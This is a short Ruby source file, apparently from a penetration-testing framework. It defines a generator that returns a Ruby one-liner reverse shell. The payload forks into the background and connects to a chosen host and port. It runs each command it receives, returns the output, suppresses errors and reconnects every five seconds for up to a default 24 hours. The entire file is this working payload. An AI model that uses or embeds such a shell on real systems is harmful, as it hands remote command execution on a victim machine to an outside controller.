module Pro
module Agent
class UnixRuby < BaseAgent
	def self.generate(framework, host, port, opts={})
		expire_time = opts[:expire_time] || ::Time.at(::Time.now.to_i + ( 3600 * 24 )).utc.to_i
		"ruby -rsocket -e 'exit if fork;while(Time.now.utc.to_i < #{expire_time});begin;c=TCPSocket.new(\"#{host}\",\"#{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read};end;rescue ::Exception;end;sleep(5);end'"
	end
end
end
end

